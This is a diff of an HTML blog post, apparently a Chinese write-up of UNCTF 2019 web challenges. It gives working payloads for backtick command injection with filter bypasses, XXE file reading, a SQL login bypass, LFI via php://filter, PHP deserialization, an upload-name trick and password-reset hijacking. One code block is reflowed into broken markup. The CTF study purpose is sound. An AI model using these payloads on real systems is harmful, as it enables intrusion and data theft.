@@ -94,7 +94,7 @@ UNCTF时间：2019年10月22日 — 2019年10月27日
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    1:46
+                    1:45
                 </span>
                 
                 
@@ -229,7 +229,7 @@ echo system($_GET[a]);
 ?&gt;
 </code></pre>
 <p>可以看到分别执行了我们给的2个命令，并且都返回了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-1.png" alt="screenshot"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-1.png" alt="screenshot"></p>
 <p><strong>④ Linux 命令终止符</strong></p>
 <p><code>空格+#（URL编码为%20%23）</code>在 Linux 命令行中为命令的终止符，类似注释符，我们可以利用这个闭合掉源码中的其他东西</p>
 <p>OK</p>
@@ -263,21 +263,21 @@ echo system($_GET[a]);
 </code></pre>
 <p>所以会导致实际匹配到的字符串为 <strong>“|`”</strong>。这时候反引号就逃逸出来了，可以直接强制地命令执行（尽管还有拼接到 file 命令后面）</p>
 <pre><code>?a=`uname`
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-2.png" alt="screenshot"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-2.png" alt="screenshot"></p>
 <p>发现可以命令执行后，查看当前目录（因为<code>ls</code>命令被禁用，这里用<code>dir</code>）</p>
 <pre><code>?a=`dir .`
 
 ?a=`dir ../../../`
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-3.png" alt="screenshot"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-4.png" alt="screenshot"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-3.png" alt="screenshot"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-4.png" alt="screenshot"></p>
 <p>但是都没有，所以直接用 find 命令找，但是也没有结果</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-5.png" alt="screenshot"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-5.png" alt="screenshot"></p>
 <p>这题正确姿势是用<code>grep -R</code>来找，通过文件内容找 flag</p>
 <blockquote>
 <p>grep -R 参数可以从某个目录开始，递归地查找文件内容</p>
 </blockquote>
 <pre><code>http://183.129.189.60:10026/?a=`/bi?/gre? -R ctf`
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-6.png" alt="screenshot"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-6.png" alt="screenshot"></p>
 <p>② 修改后</p>
 <p>出题人将<code>\\</code>换到了<code>\*</code>前面，其他没变</p>
 <pre><code class="php"> if (preg_match(&quot;/\&#39;|\&quot;|,|;|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))
@@ -296,39 +296,39 @@ if (preg_match(&quot;/\&#39;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|&lt;
 root@Knlvre:/var/www/html# file &quot;\&quot;&quot;
 &quot;: cannot open `&quot;&#39; (No such file or directory)
 </code></pre><p>而<code>b</code>的 空格+# 是为了注释掉最后面的双引号</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-7.png" alt="1-7"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/1-7.png" alt="1-7"></p>
 <h2 id="Do-you-like-xml"><a href="#Do-you-like-xml" class="headerlink" title="Do you like xml?"></a>Do you like xml?</h2><blockquote>
 <p>考点：XXE</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/2-1.png" alt="2-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/2-1.png" alt="2-1"></p>
 <p>看到<code>flag in this pic</code>，下载图片，<code>winhex</code>打开在中间发现<code>flag in flag.php</code>的字样</p>
 <p>抓包提交用户名和密码，发现可能有XXE</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/2-2.png" alt="2-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/2-2.png" alt="2-2"></p>
 <p>测试 payload </p>
 <pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
 &lt;!DOCTYPE whatever[
 &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;
 ]&gt;
 &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/2-3.png" alt="2-3"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/2-3.png" alt="2-3"></p>
 <p>解码就是 flag</p>
 <h2 id="K-amp-K战队的老家"><a href="#K-amp-K战队的老家" class="headerlink" title="K&amp;K战队的老家"></a>K&amp;K战队的老家</h2><blockquote>
 <p>考点：LFI、万能密码</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-1.png" alt="3-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-1.png" alt="3-1"></p>
 <p>密码爆破无结果，万能密码登陆成功（用浏览器输入会出错，burpsuit输入就可以）</p>
 <pre><code>1&#39; || &#39;1
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-2.png" alt="3-2"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-2.png" alt="3-2"></p>
 <p>点击 俱乐部运维手册 会提示<code>Identity problems, please relogin</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-3.png" alt="3-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-3.png" alt="3-3"></p>
 <p>添加<code>x-forwarded-for:127.0.0.1</code>没用，应该要 cookie 了。尝试 URL 中的参数<code>m</code>，LFI payload</p>
 <pre><code>?m=php://filter/read=convert.base64-encode/resource=home.php
 </code></pre><p>但是这里提示<code>Illegal</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-4.png" alt="3-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-4.png" alt="3-4"></p>
 <p>这说明这里还是有做过滤的，应该是有利用价值。过滤了<code>php</code>、<code>base64</code>，用大小写成功绕过</p>
 <p>这里直接写<code>home</code>而不是<code>home.php</code>是因为之前的<code>?m=index</code>和<code>?m=debug</code>也都没有加后缀，猜测可能后台会加上去</p>
 <pre><code>?m=php://filter/read=convert.base64-encode/resource=home
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-5.png" alt="3-5"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-5.png" alt="3-5"></p>
 <p>解码之后拿到<code>home.php</code>的源码</p>
 <pre><code class="php">&lt;?php
 error_reporting(0);
@@ -467,55 +467,53 @@ function echo_index() {
 ?&gt;</code><br><br> </details> 
 
 <p><code>db.php</code></p>
-<pre><code class="php">&lt;?php
-error_reporting(0);
-class db{
-
-    public function init() {
-        $con = mysql_connect(&quot;localhost:3306&quot;,&quot;dog&quot;,&quot;123456&quot;);
-        if(!$con) {
-            die(&quot;Connect failed: &quot; . mysql_error());
-        }
-        return $con;
+<p>​<code>`</code>php<br>&lt;?php<br>error_reporting(0);<br>class db{</p>
+<pre><code>public function init() {
+    $con = mysql_connect(&quot;localhost:3306&quot;,&quot;dog&quot;,&quot;123456&quot;);
+    if(!$con) {
+        die(&quot;Connect failed: &quot; . mysql_error());
     }
+    return $con;
+}
 
-    public function user_check($u, $p, $obj) {
-        $sql = &quot;SELECT id,username FROM users WHERE username = &#39;$u&#39; and password = &#39;$p&#39;&quot;;
-        $con = $this-&gt;init();
-        mysql_select_db(&quot;unctf&quot;, $con);
-        $result = mysql_query($sql,$con);
-        $row = mysql_fetch_array($result);
-        if(count($row) &gt;= 4) {
-            $obj-&gt;id = intval($row[&#39;id&#39;]);
-            $obj-&gt;username = $row[&#39;username&#39;];
-            $serstr = serialize($obj);
-            $serstr = cookie_encode($serstr);
+public function user_check($u, $p, $obj) {
+    $sql = &quot;SELECT id,username FROM users WHERE username = &#39;$u&#39; and password = &#39;$p&#39;&quot;;
+    $con = $this-&gt;init();
+    mysql_select_db(&quot;unctf&quot;, $con);
+    $result = mysql_query($sql,$con);
+    $row = mysql_fetch_array($result);
+    if(count($row) &gt;= 4) {
+        $obj-&gt;id = intval($row[&#39;id&#39;]);
+        $obj-&gt;username = $row[&#39;username&#39;];
+        $serstr = serialize($obj);
+        $serstr = cookie_encode($serstr);
 
-            setcookie(&#39;identy&#39;, $serstr);
-            echo(&#39;&lt;script&gt;alert(&quot;Login Success&quot;);window.location.href=&quot;./home.php?m=index&quot;;&lt;/script&gt;&#39;);
-        }
-        else {
-            die(&#39;&lt;script&gt;alert(&quot;Login Fail&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;);
-        }
+        setcookie(&#39;identy&#39;, $serstr);
+        echo(&#39;&lt;script&gt;alert(&quot;Login Success&quot;);window.location.href=&quot;./home.php?m=index&quot;;&lt;/script&gt;&#39;);
     }
-
-    public function index_check($i, $u) {
-        $sql = &quot;SELECT id,username FROM users WHERE username = &#39;$u&#39; and id = $i&quot;;
-        $con = $this-&gt;init();
-        mysql_select_db(&quot;unctf&quot;, $con);
-        $result = mysql_query($sql,$con);
-        $row = mysql_fetch_array($result);
-        if(count($row) &lt; 4) {
-            setcookie(&quot;identy&quot;, &quot;&quot;);
-            die(&#39;&lt;script&gt;alert(&quot;Identity problems, please relogin&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;);
-        }
+    else {
+        die(&#39;&lt;script&gt;alert(&quot;Login Fail&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;);
     }
 }
 
-?&gt;
-</code></pre>
-<p><code>debug.php</code></p>
-<pre><code class="php">&lt;?php
+public function index_check($i, $u) {
+    $sql = &quot;SELECT id,username FROM users WHERE username = &#39;$u&#39; and id = $i&quot;;
+    $con = $this-&gt;init();
+    mysql_select_db(&quot;unctf&quot;, $con);
+    $result = mysql_query($sql,$con);
+    $row = mysql_fetch_array($result);
+    if(count($row) &lt; 4) {
+        setcookie(&quot;identy&quot;, &quot;&quot;);
+        die(&#39;&lt;script&gt;alert(&quot;Identity problems, please relogin&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;);
+    }
+}
+</code></pre><p>}</p>
+<p>?&gt;</p>
+<pre><code>
+`debug.php`
+
+```php
+&lt;?php
 error_reporting(0);
 class debug{
 
@@ -579,20 +577,19 @@ class debug{
 }
 
 ?&gt;
-</code></pre>
-<p>通读一遍代码，发现是反序列化的漏洞，漏洞点在<code>debug.php</code>的<code>debug类</code>的<code>__tostring()魔术方法</code>中，可以直接<code>include flag</code>而调用它的在<code>debug方法</code>中的<code>echo $this-&gt;forbidden</code>，最后<code>$forbidden</code>必须是<code>debug类</code>的实例</p>
+</code></pre><p>通读一遍代码，发现是反序列化的漏洞，漏洞点在<code>debug.php</code>的<code>debug类</code>的<code>__tostring()魔术方法</code>中，可以直接<code>include flag</code>而调用它的在<code>debug方法</code>中的<code>echo $this-&gt;forbidden</code>，最后<code>$forbidden</code>必须是<code>debug类</code>的实例</p>
 <p>这里要执行<code>$this-&gt;forbidden</code>需要<code>$this-&gt;choose=2</code>，因为<code>switch()</code>是弱类型比较，所以这里可以用<code>&quot;2&quot;</code>绕过</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-6.png" alt="screenshot"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-6.png" alt="screenshot"></p>
 <p>而使用<code>debug-&gt;debug()</code>是在<code>home.php</code>中</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-7.png" alt="3-7"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-7.png" alt="3-7"></p>
 <p>进入这个<code>else</code>的条件是<code>$mothed</code>不等于<code>login、index、logout</code>，而 $mothed 就是通过<code>GET</code>到的<code>m</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-8.png" alt="3-8"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-8.png" alt="3-8"></p>
 <p>我们按 else 的每一步分析</p>
 <p>① 第一步：经过<code>func.php-&gt;mothed_waf()</code>的检查</p>
 <pre><code class="php">mothed_waf($mothed);
 </code></pre>
 <p>可以看到我们可以大小写绕过 base64、php、write ，但无法绕过 flag，所以无法直接包含</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-9.png" alt="3-9"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-9.png" alt="3-9"></p>
 <p>② 第二步：为 $mothed 添加 .php 的后缀并且<code>include</code></p>
 <pre><code class="php">$page = $mothed . &quot;.php&quot;;
 include($page);
@@ -601,28 +598,28 @@ include($page);
 <p>③ 第三步：调用<code>func.php-&gt;check()</code></p>
 <pre><code class="php">check($cookie, $db, $session);
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-10.png" alt="3-10"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-10.png" alt="3-10"></p>
 <p>首先<code>$str（也就是home.php-&gt;$cookie）</code>不能为空。然后调用了<code>func.php-&gt;cookie_decode()</code>来解码 $str ，这个函数不必太多理解，因为加密和解密函数都是自带的，会用就行</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-11.png" alt="3-11"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-11.png" alt="3-11"></p>
 <p>将解密的内容赋值给<code>$objstr</code>，然后反序列化了 $objstr ，赋值给<code>$session</code>，并且对 $session-username 调用<code>func.php-&gt;waf()</code>进行检查</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-12.png" alt="3-12"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-12.png" alt="3-12"></p>
 <p>我们这里需要看一下那个类有<code>id、username</code>属性，发现是<code>session.php-&gt;session类</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-13.png" alt="3-13"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-13.png" alt="3-13"></p>
 <p>接下来调用<code>db.php-&gt;index_check()</code>方法</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-14.png" alt="3-14"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-14.png" alt="3-14"></p>
 <p>对<code>$u($session-&gt;id)</code>和<code>$i($session-&gt;username)</code>进行查询，结果少于 4 条时退出。结合如下代码，我们猜测正常用户数据库的查询结果应该就在 4 条或以上，所以这里只要是数据库有的用户就行了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-15.png" alt="3-15"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-15.png" alt="3-15"></p>
 <p>④ 创建 debug 类</p>
 <pre><code class="php">$d = new debug($session, $d);
 $d-&gt;vt($session, $d);
 $d-&gt;debug($session);
 </code></pre>
 <p>类中有<code>__construct()魔术方法</code>、<code>vt()</code>和<code>debug()</code>方法，所以我们控制的<code>$session</code>变量必须是<code>debug类</code>的序列化，才有后面的<code>debug()</code>方法可以执行</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-16.png" alt="3-16"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-16.png" alt="3-16"></p>
 <p>所以前面的<code>func.php-&gt;check()</code>中检查的<code>$id</code>和<code>$username</code>自己添加了，并且 $id 需要猜，因为我们并不知道，先试一下1</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-17.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-17.png" alt></p>
 <p>数据库查询无结果，尝试 2 时就对了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-18.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-18.png" alt></p>
 <p>但是有了新的问题，提示<code>token error</code>，并且<code>include(&#39;access.php&#39;)</code>，应该是这个<code>access.php</code>搞的鬼。先拿源码，但是像之前那样伪协议拿时，发现过滤了<code>access</code>，并且无法大小写绕过。最后通过下载<code>access.php.bak</code>备份文件才拿到源码</p>
 <pre><code class="php">&lt;?php
 error_reporting(0);
@@ -670,10 +667,10 @@ $poc = new debug();
 echo cookie_encode(serialize($poc))
 ?&gt;
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-19.png" alt></p>
-<h2 id="simple-web"><a href="#simple-web" class="headerlink" title="simple_web"></a>simple_web</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/4-1.png" alt="4-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/3-19.png" alt></p>
+<h2 id="simple-web"><a href="#simple-web" class="headerlink" title="simple_web"></a>simple_web</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/4-1.png" alt="4-1"></p>
 <p>存在<code>robots.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/4-2.png" alt="4-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/4-2.png" alt="4-2"></p>
 <p>访问<code>getsandbox.php</code>，得到如下代码</p>
 <pre><code class="php">&lt;?php
 if (isset($_GET[&#39;reset&#39;])) {
@@ -749,54 +746,54 @@ if (isset($_POST[&#39;submit&#39;])) {
 ?&gt; 
 </code></pre>
 <p>先做个简单测试</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-1.png" alt="5-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/5-1.png" alt="5-1"></p>
 <p>这题的关键点在于<code>move_uploaded_file()</code>函数会自动递归删除最后的<code>/.</code>字符串（或者 Windows 环境下自动删除文件名最后的<code>.</code>）</p>
 <pre><code class="php">move_uploaded_file($temp_name, $img_path)
 </code></pre>
 <p>当我们有传入<code>$_POST[&#39;save_name&#39;]</code>时，并且是一个数组，<code>$file</code>这个变量就可以是一个数组，并且内容随意控制，无需受<code>explode()</code>控制，思路：</p>
 <p>① 令数组的最后一个参数为允许的后缀，比如 jpg</p>
 <p>② 令<code>$file[count($file) - 1]</code>为空，这样<code>$file_name</code>等于“数组的第一位 + <code>.</code>”，然后我们使数组的第一位为“文件名 + <code>/</code>”，这样传入 move_uploaded_file() 函数中时，就是“文件名 + <code>/.</code>”，后面的<code>/.</code>就会被处理掉。看一下 count() 对数组处理的漏洞，对没有赋值的数组元素不计算，所以可以利用这一点来使得<code>$file[count($file) - 1]</code>为空</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-3.png" alt="5-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/5-3.png" alt="5-3"></p>
 <p>最后结果</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-4.png" alt="5-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/5-4.png" alt="5-4"></p>
 <p>连接后在根目录下拿到 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-5.png" alt="5-5"></p>
-<h2 id="光坂镇的小诗1"><a href="#光坂镇的小诗1" class="headerlink" title="光坂镇的小诗1"></a>光坂镇的小诗1</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/6-1.png" alt="6-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/5-5.png" alt="5-5"></p>
+<h2 id="光坂镇的小诗1"><a href="#光坂镇的小诗1" class="headerlink" title="光坂镇的小诗1"></a>光坂镇的小诗1</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/6-1.png" alt="6-1"></p>
 <p>点击对应的名字发现参数 id 会变，加单引号之后发现会被添加反斜杠转义掉，猜想会不会是<code>宽字节注入</code>，用<code>%df</code>，被解析成一个字符，成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/6-2.png" alt="6-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/6-2.png" alt="6-2"></p>
 <p>邮件查看源码，可以通过<code>img</code>标签的<code>src</code>来注入。发现单引号包裹</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/6-3.png" alt="6-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/6-3.png" alt="6-3"></p>
 <p>联合注入测试成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/6-4.png" alt="6-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/6-4.png" alt="6-4"></p>
 <p>注表名</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/6-5.png" alt="6-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/6-5.png" alt="6-5"></p>
 <p>由于不能使用<code>引号</code>，所以这里直接<code>select * from flag</code>，然后用<code>limit</code>输出，拿到 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/6-6.png" alt="6-6"></p>
-<h2 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB_Reset_Password"></a>NSB_Reset_Password</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/7-1.png" alt="7-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/6-6.png" alt="6-6"></p>
+<h2 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB_Reset_Password"></a>NSB_Reset_Password</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/7-1.png" alt="7-1"></p>
 <p>注册一个普通用户，登录后给了提示</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/7-2.png" alt="7-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/7-2.png" alt="7-2"></p>
 <p>重置普通用户的密码，果然收到邮件。输入验证码，来到重改密码的界面，先放着</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/7-3.png" alt="7-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/7-3.png" alt="7-3"></p>
 <p>然后此时再新开一个窗口，回到上一个忘记密码的页面，用户名填写 admin</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/7-5.png" alt="7-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/7-5.png" alt="7-5"></p>
 <p>然后系统会发送邮件，我们虽然拿不到验证码，但是此时服务器后台更改密码的用户变为 admin。我们此时只要在第一个重新设置密码的界面修改密码，改的就是 admin 的密码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/7-4.png" alt="7-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/7-4.png" alt="7-4"></p>
 <p>admin 登陆拿到 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/7-6.png" alt="7-6"></p>
-<h2 id="easy-pentest"><a href="#easy-pentest" class="headerlink" title="easy_pentest"></a>easy_pentest</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-1.png" alt="8-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/7-6.png" alt="7-6"></p>
+<h2 id="easy-pentest"><a href="#easy-pentest" class="headerlink" title="easy_pentest"></a>easy_pentest</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-1.png" alt="8-1"></p>
 <p>根据题目提示<code>thinkphp</code>，扫描 thinkphp 后台日志，果然存在<code>[ip]/runtime/log/201909/02.log</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-3.png" alt="8-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-3.png" alt="8-3"></p>
 <p>注意其中有<code>safe_key</code>参数以及它的值，将它们添加到URL中，进入<code>Sage Page</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-2.png" alt="8-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-2.png" alt="8-2"></p>
 <p>然后在返回的页面中，看到<code>Think PHP V5</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-4.png" alt="8-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-4.png" alt="8-4"></p>
 <p>参考文章：<a href="https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener"> 记一次有趣的tp5代码执行 </a></p>
 <p>payload 直接打</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-5.png" alt="8-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-5.png" alt="8-5"></p>
 <p>在<code>/home</code>下发现 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-6.png" alt="8-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-6.png" alt="8-6"></p>
 <p><code>file</code>字符串不能用，<code>show_source</code>拿到 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-7.png" alt="8-7"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/UNCTF/8-7.png" alt="8-7"></p>
 <hr>
 <p><strong>Reference</strong></p>
